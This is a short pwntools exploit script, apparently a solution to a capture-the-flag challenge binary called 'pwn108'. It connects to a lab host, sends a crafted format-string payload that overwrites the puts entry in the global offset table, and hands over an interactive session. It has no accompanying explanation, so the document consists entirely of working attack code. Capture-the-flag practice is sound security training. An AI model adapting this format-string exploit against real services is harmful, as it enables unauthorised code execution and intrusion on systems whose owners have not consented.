from pwn import *

context(arch="amd64", os="linux", endian="little")

elf = ELF("./pwn108")
rop = ROP(elf)
r = remote("10.10.165.164", 9008)

puts_got = elf.got["puts"]

fmt_str = b"%64x%13$ln%4603x%14$hn" + b"\x41" * 2 + p64(puts_got+2) + p64(puts_got)

r.recvuntil(b"=[Your name]: ")
r.sendline(b"Exploited")
r.recvuntil(b"=[Your Reg No]: ")
r.sendline(fmt_str)

r.interactive()
